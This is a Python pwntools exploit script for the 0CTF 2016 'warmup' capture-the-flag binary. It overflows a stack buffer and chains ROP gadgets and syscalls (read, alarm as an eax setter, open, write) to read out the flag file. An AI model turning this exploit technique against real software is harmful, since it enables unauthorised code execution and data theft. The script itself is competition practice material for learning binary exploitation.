from pwn import *
import time
context.arch = 'i386'
elf = ELF("./warmup")

rop_addr = 0x804815a
set_regt = 0x8048122
sys_read = 0x804811d
sys_alarm = 0x804810d
sys_write = 0x8048135
padding = 'A'*0x20

read_path_payload = padding
read_path_payload += p32(sys_read)
read_path_payload += p32(rop_addr)
read_path_payload += p32(0)
read_path_payload += p32(0x8049200)
read_path_payload += p32(0x20)

open_flag_payload = padding
open_flag_payload += p32(sys_alarm)
open_flag_payload += p32(set_regt)
open_flag_payload += p32(rop_addr)
open_flag_payload += p32(0x8049200)
open_flag_payload += p32(6)
#fd = 3

read_data_payload = padding
read_data_payload += p32(sys_read)
read_data_payload += p32(rop_addr)
read_data_payload += p32(3)
read_data_payload += p32(0x8049300)
read_data_payload += p32(0x20)

write_data_payload = padding
write_data_payload += p32(sys_write)
write_data_payload += p32(rop_addr)
write_data_payload += p32(1)
write_data_payload += p32(0x8049300)
write_data_payload += p32(0x20)

io = process("./warmup")
io.recvuntil("Welcome to 0CTF 2016!\n")

io.send(read_path_payload)
io.recvuntil("Good Luck!\n")
io.send("flag\x00")

sleep(5)
io.send(open_flag_payload)
io.recvuntil("Good Luck!\n")

io.send(read_data_payload)
io.recvuntil("Good Luck!\n")

io.send(write_data_payload)
io.recvuntil("Good Luck!\n")

print io.recv()
